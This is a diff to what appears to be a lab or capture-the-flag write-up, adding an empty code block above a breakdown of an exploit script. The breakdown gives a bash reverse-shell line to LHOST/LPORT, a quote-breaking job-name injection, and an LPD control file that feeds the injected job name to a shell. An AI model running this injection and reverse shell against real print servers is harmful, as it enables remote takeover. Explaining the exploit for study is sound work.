@@ -505,6 +505,9 @@ python3 foothold.py    # terminal 2
 
 **Exploit (`foothold.py`) breakdown:**
 
+```py
+```
+
 - `cmd = bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'`: the reverse-shell payload to execute on the target.
 - `job = "'; {cmd}; #"`: closes the single quote in `echo 'Archive: ...'`, runs `cmd`, and comments out the trailing redirect so the shell line stays valid.
 - `control = "Hlocalhost\nPtester\nJ{job}\n"`: an LPD control file; the `J` line is the one the server parses as the job name and feeds to the shell.
